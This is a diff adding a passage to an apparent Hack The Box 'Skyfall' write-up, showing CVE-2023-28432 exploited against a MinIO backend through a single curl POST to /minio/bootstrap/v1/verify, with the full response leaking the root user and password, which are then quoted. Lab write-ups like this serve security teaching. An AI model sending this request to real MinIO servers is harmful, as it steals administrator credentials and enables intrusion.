@@ -268,4 +268,50 @@ Googling for `minio exploits` return some interesting results
 
 ![image](https://github.com/user-attachments/assets/6618aaf3-e5d1-4e14-b27a-81b121c9554a)
 
+Googling for `CVE-2023-28432` returns [this POC](https://github.com/acheiii/CVE-2023-28432)
 
+The exploit seems simple enough: perform a `POST` request to the Minio Endpoint at path `/minio/bootstrap/v1/verify`
+
+Recall that the Minio Endpoint was discovered at the metrics page to be: `http://prd23-s3-backend.skyfall.htb/minio/v2/metrics/cluster`
+
+```console
+root@kali:~# sed -i '0,/localhost/a 10.10.11.254    prd23-s3-backend.skyfall.htb' /etc/hosts
+
+root@kali:~# curl -v -X POST http://prd23-s3-backend.skyfall.htb/minio/bootstrap/v1/verify
+* Host prd23-s3-backend.skyfall.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.254
+*   Trying 10.10.11.254:80...
+* Connected to prd23-s3-backend.skyfall.htb (10.10.11.254) port 80
+> POST /minio/bootstrap/v1/verify HTTP/1.1
+> Host: prd23-s3-backend.skyfall.htb
+> User-Agent: curl/8.7.1
+> Accept: */*
+>
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Server: nginx/1.18.0 (Ubuntu)
+< Date: Thu, 18 Jul 2024 06:25:40 GMT
+< Content-Type: text/plain; charset=utf-8
+< Content-Length: 1444
+< Connection: keep-alive
+< Content-Security-Policy: block-all-mixed-content
+< Strict-Transport-Security: max-age=31536000; includeSubDomains
+< Vary: Origin
+< X-Amz-Id-2: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+< X-Amz-Request-Id: 17E33A9FAFD20213
+< X-Content-Type-Options: nosniff
+< X-Xss-Protection: 1; mode=block
+<
+{"MinioEndpoints":[{"Legacy":false,"SetCount":1,"DrivesPerSet":4,"Endpoints":[{"Scheme":"http","Opaque":"","User":null,"Host":"minio-node1:9000","Path":"/data1","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":false},{"Scheme":"http","Opaque":"","User":null,"Host":"minio-node2:9000","Path":"/data1","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":true},{"Scheme":"http","Opaque":"","User":null,"Host":"minio-node1:9000","Path":"/data2","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":false},{"Scheme":"http","Opaque":"","User":null,"Host":"minio-node2:9000","Path":"/data2","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":true}],"CmdLine":"http://minio-node{1...2}/data{1...2}","Platform":"OS: linux | Arch: amd64"}],"MinioEnv":{"MINIO_ACCESS_KEY_FILE":"access_key","MINIO_BROWSER":"off","MINIO_CONFIG_ENV_FILE":"config.env","MINIO_KMS_SECRET_KEY_FILE":"kms_master_key","MINIO_PROMETHEUS_AUTH_TYPE":"public","MINIO_ROOT_PASSWORD":"GkpjkmiVmpFuL2d3oRx0","MINIO_ROOT_PASSWORD_FILE":"secret_key","MINIO_ROOT_USER":"5GrE1B2YGGyZzNHZaIww","MINIO_ROOT_USER_FILE":"access_key","MINIO_SECRET_KEY_FILE":"secret_key","MINIO_UPDATE":"off","MINIO_UPDATE_MINISIGN_PUBKEY":"RWTx5Zr1tiHQLwG9keckT0c45M3AGeHD6IvimQHpyRywVWGbP1aVSGav"}}
+* Connection #0 to host prd23-s3-backend.skyfall.htb left intact
+```
+
+The `MINIO_ROOT_USER` and `MINIO_ROOT_PASSWORD` found:
+
+```json
+{
+  "MINIO_ROOT_USER":"5GrE1B2YGGyZzNHZaIww",
+  "MINIO_ROOT_PASSWORD":"GkpjkmiVmpFuL2d3oRx0"
+}
+```
